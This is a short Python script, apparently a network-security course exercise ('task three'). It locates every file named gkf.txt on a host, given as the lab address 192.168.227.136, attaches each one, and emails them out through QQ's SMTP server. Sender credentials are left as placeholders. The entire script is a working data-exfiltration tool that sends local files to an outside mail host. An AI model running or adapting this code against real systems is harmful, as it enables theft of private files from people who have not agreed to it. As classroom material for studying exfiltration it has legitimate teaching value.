# coding:utf8
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header

#设置服务器所需信息
#qq邮箱服务器地址
mail_host = 'smtp.qq.com'  
#qq用户名
mail_user = 'input your sender email'  
#qq邮箱授权码 
mail_pass = 'input your authentication code here!'   
#邮件发送方邮箱地址
sender = 'input your sender email'  
#邮件接受方邮箱地址
receiver = 'input your reciever email'

#设置email信息
#创建一个带附件的实例
message = MIMEMultipart()
message['From'] = Header(sender, 'utf-8')
message['To'] =  Header(receiver, 'utf-8')
subject = '网络安全任务三'
message['Subject'] = Header(subject, 'utf-8')

#邮件正文内容
message.attach(MIMEText('这是主机192.168.227.136上的所有gkf.txt', 'plain', 'utf-8'))

bashCommand = "locate -r gkf.txt"
stream = os.popen(bashCommand)
output = stream.read().split('\n') 
for path in output:
    if path == "":
        break
    print(path)
    # 构造附件，传送服务器下的所有 gkf.txt 文件
    att = MIMEText(open(path, 'rb').read(), 'base64', 'utf-8')
    att["Content-Type"] = 'application/octet-stream'
    att["Content-Disposition"] = 'attachment; filename="' + path + "\"'"
    message.attach(att)

#登录并发送邮件
try:
    smtpObj = smtplib.SMTP_SSL(mail_host)
    #连接到服务器
    smtpObj.connect(mail_host,465)
    #登录到服务器
    smtpObj.login(mail_user,mail_pass) 
    #发送
    smtpObj.sendmail(
        sender,receiver,message.as_string()) 
    #退出
    smtpObj.quit() 
    print('success')
except smtplib.SMTPException as e:
    print('error',e) #打印错误



